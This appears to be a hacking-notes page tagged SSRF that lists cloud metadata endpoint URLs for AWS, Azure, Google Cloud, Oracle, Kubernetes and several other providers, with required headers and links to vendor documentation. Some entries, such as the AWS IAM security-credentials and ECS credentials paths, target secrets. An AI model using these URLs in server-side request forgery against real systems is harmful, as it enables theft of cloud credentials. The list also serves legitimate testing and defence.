---
date: "2020-01-30T16:20:01"
title: Cloud metadata URLs
tags: [ SSRF, hacking, cloud metadata URLs ]
---

### Alibaba

```
http://100.100.100.200/latest/meta-data/
http://100.100.100.200/latest/meta-data/instance-id
http://100.100.100.200/latest/meta-data/image-id
```

**References**
- https://www.alibabacloud.com/help/faq-detail/49122.htm

***

### AWS

```
http://169.254.169.254/latest/user-data
http://169.254.169.254/latest/user-data/iam/security-credentials/[ROLE NAME]
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://169.254.169.254/latest/meta-data/iam/security-credentials/[ROLE NAME]
http://169.254.169.254/latest/meta-data/ami-id
http://169.254.169.254/latest/meta-data/reservation-id
http://169.254.169.254/latest/meta-data/hostname
http://169.254.169.254/latest/meta-data/public-keys/0/openssh-key
http://169.254.169.254/latest/meta-data/public-keys/[ID]/openssh-key
http://169.254.169.254/
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/public-keys/
```

#### ECS Task

```
http://169.254.170.2/v2/credentials/
```

**References**
- http://docs.aws.amazon.com/AWSEC2/latest/UserGuide/ec2-instance-metadata.html#instancedata-data-categories
- https://docs.aws.amazon.com/AmazonECS/latest/developerguide/task-metadata-endpoint-v2.html

* * * 

### Azure

#### No header Required 

```
http://169.254.169.254/metadata/v1/maintenance
```

#### Requires header
Must use `Metadata: true` request header

```
http://169.254.169.254/metadata/instance?api-version=2017-04-02
http://169.254.169.254/metadata/instance/network/interface/0/ipv4/ipAddress/0/publicIpAddress?api-version=2017-04-02&format=text
```

**References**
- https://azure.microsoft.com/en-us/blog/what-just-happened-to-my-vm-in-vm-metadata-service/
- https://docs.microsoft.com/en-us/azure/virtual-machines/windows/instance-metadata-service

***

### Google Cloud

#### Requires header 

**Must use one of the following headers** 

- `Metadata-Flavor: Google`
- `X-Google-Metadata-Request: True`

```
http://169.254.169.254/computeMetadata/v1/
http://metadata.google.internal/computeMetadata/v1/
http://metadata/computeMetadata/v1/
http://metadata.google.internal/computeMetadata/v1/instance/hostname
http://metadata.google.internal/computeMetadata/v1/instance/id
http://metadata.google.internal/computeMetadata/v1/project/project-id
http://metadata.google.internal/computeMetadata/v1/instance/disks/?recursive=true
```

#### No header required (old)

```
http://metadata.google.internal/computeMetadata/v1beta1/
```

**References**

- https://cloud.google.com/compute/docs/metadata

***

### Digital Ocean

```
http://169.254.169.254/metadata/v1.json
http://169.254.169.254/metadata/v1/
http://169.254.169.254/metadata/v1/id
http://169.254.169.254/metadata/v1/user-data
http://169.254.169.254/metadata/v1/hostname
http://169.254.169.254/metadata/v1/region
http://169.254.169.254/metadata/v1/interfaces/public/0/ipv6/address

```

**References**
- https://developers.digitalocean.com/documentation/metadata/

***


### HP Helion
```
http://169.254.169.254/2009-04-04/meta-data/
```

***


### Kubernetes
```
https://kubernetes.default
https://kubernetes.default.svc.cluster.local
https://kubernetes.default.svc/metrics
```
**References**
- https://twitter.com/Random_Robbie/status/1072242182306832384
- https://kubernetes.io/docs/tasks/debug-application-cluster/debug-service/

***

### OpenStack/RackSpace

```
http://169.254.169.254/openstack
```

**References**
- https://docs.openstack.org/nova/latest/user/metadata-service.html

***


### Oracle Cloud
```
http://192.0.0.192/latest/
http://192.0.0.192/latest/user-data/
http://192.0.0.192/latest/meta-data/
http://192.0.0.192/latest/attributes/
```

**References**
- https://docs.oracle.com/en/cloud/iaas/compute-iaas-cloud/stcsg/retrieving-instance-metadata.html

***

### Packetcloud
```
https://metadata.packet.net/userdata
```

